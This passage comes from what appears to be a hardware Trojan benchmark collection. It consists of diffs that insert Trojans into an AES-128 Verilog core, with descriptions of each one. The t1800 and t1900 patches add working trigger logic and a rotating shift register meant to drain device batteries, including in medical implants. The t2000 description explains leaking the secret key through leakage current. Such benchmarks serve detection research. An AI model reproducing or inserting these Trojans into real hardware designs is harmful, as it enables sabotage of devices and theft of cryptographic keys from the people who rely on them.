+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t1800/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1800/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1800/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1800/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,29 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		TSC Trojan (clk, rst, state);
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1800/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1800/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,47 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+    input [127:0] state
+    );
+
+	 reg 	[127:0] DynamicPower; 
+	 reg 	Tj_Trig;
+	 
+	 always @(rst, clk)
+	 begin
+		if (rst == 1)
+			DynamicPower &lt;= 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+		else if (Tj_Trig == 1)
+			DynamicPower &lt;= {DynamicPower[0],DynamicPower[127:1]}; 	
+	 end
+
+	always @(rst, state)
+	begin
+		if (rst == 1) begin 
+			Tj_Trig &lt;= 0; 
+		end else if (state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) begin 
+			Tj_Trig &lt;= 1; 
+		end
+	end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="51d256bf-2f6b-424f-b2f4-c636e189fbe1" name="t1900" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	At the core of lightweight applications, such as medical implant devices,are the batteries that power them and 
	the success of the device restsheavily on them. This Trojan drains the battery once it is activated. The Trojan 
	gets activated after 128'hFFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF encryptions. The Trojan payload is a shift 
	register which continuously rotates after Trojan activation. The Trojan increases the power consumption and hence 
	decreases the expected lifetime of the battery. 



Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Denial of Service
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1900/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1900/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/battery_tb.v aes/src/tjin-t1900/battery_tb.v
--- aes/src/tjfree/battery_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1900/battery_tb.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   18:44:19 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES4/AES_BatteryDepletion/battery_tb.v
+// Project Name:  AES_BatteryDepletion
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module battery_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+
+	initial begin
+		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+
+		#50
+		rst = 1;
+		
+		#25
+		rst = 0;
+
+		#25
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t1900/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1900/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t1900/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1900/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1900/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1900/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t1900/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t1900/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1900/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1900/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,29 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		TSC Trojan (clk, rst, out);
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1900/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1900/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,57 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+    input [127:0] out
+    );
+
+	reg	[127:0] DynamicPower; 
+	reg [127:0] Counter;
+	reg	Tj_Trig;
+	 
+	always @(rst, clk)
+	begin
+		if (rst == 1)
+			DynamicPower &lt;= 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+		else if (Tj_Trig == 1)
+			DynamicPower &lt;= {DynamicPower[0],DynamicPower[127:1]}; 	
+	end
+
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end 
+	end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="5035c804-c3f8-4ad2-abb4-b5de9950bb8d" name="t2000" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After detecting a specific sequence of input plaintext, the Trojan leaks the secret key of AES-128 through the leakage 
	current. The leakage circuit (LC) consists of a shift register holding the secret key and two inverters. The least significant 
	bit of the shift register is connected to one inverter whose output connected to the input of the other inverter. 
	Whenever the least significant bit is '0', a direct path between power and ground composed by the PMOS of the first 
	inverter and the NMOS of the second inverter is created for a limited time. Therefore, the secret key can be retrieved 
	by measuring the leakage current.


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t2000/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t2000/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t2000/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2000/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t2000/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t2000/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tb_top.v aes/src/tjin-t2000/tb_top.v
--- aes/src/tjfree/tb_top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2000/tb_top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   18:44:19 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES4/AES_BatteryDepletion/battery_tb.v
+// Project Name:  AES_BatteryDepletion
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_TOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+
+	initial begin
+		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+
+		#50
+		rst = 1;
+		
+		#25
+		rst = 0;
+
+		#25
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+
+endmodule
diff -rupN aes/src/tjfree/tb_tsc.v aes/src/tjin-t2000/tb_tsc.v
--- aes/src/tjfree/tb_tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t2000/tb_tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,62 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_TSC;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Instantiate the Unit Under Test (UUT)
+	TSC uut (
+    .clk(clk),
+    .rst(rst),
+	 .key(key),
+	 .Tj_Trig(Tj_Trig)
+    );
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #5 clk = ~clk;
+endmodule
+
